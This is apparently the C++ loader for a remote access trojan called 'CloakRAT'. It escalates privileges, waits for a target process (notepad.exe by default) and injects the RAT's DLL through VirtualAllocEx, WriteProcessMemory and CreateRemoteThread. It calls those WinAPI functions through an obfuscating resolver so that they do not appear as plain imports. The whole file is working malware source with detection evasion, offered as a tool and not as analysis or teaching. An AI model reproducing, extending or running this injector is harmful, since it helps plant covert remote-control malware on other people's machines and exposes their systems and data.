#include <iostream>
#include <windows.h>
#include "utils.h"
#include "winapi_signatures.h"
#include "winapi_obfuscation.h"

#define DLL_PATH "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll"
#define TARGET_EXE "notepad.exe"
#define KERNEL32_STR "kernel32.dll"

int main(int argc, char** argv)
{
	const char* dllPath = DLL_PATH;
	const char* procName = argc <= 1 ? TARGET_EXE : argv[1];

	if (EscalatePrivilege() == -1)
	{
		std::cerr << "Failed to escalate privileges. The injection may not work!" << std::endl;
		return 1;
	}

	DWORD procID = 0;
	while (!procID) // while the process was not found
	{
		procID = GetProcessIdByName(procName);
		Sleep(100);
	}
	
	HANDLE hProc = resolve_func<OpenProcess_t>("OpenProcess")(PROCESS_ALL_ACCESS, 0, procID);

	if (hProc && hProc != INVALID_HANDLE_VALUE) // if we got a handle successfully
	{
		LPVOID dllAddrInRemoteProcess = resolve_func<VirtualAllocEx_t>("VirtualAllocEx")(hProc, NULL, strlen(dllPath) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (dllAddrInRemoteProcess) {
			resolve_func<WriteProcessMemory_t>("WriteProcessMemory")(hProc, dllAddrInRemoteProcess, dllPath, strlen(dllPath) + 1, 0);
		}
		else
		{
			std::cout << "Error: VirtualAllocEx() returned NULL: Err #" << GetLastError() << std::endl;
			return 1;
		}

		HANDLE threadHandle = resolve_func<CreateRemoteThread_t>("CreateRemoteThread")(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, dllAddrInRemoteProcess, 0, 0);

		if (threadHandle == NULL)
			std::cerr << "Error in CreateRemoteThread(): Err#" << GetLastError() << std::endl;
		else
			CloseHandle(threadHandle);
	}
	else {
		std::cerr << "Error in OpenProcess(): Err#" << GetLastError() << std::endl;
	}

	return 0;

}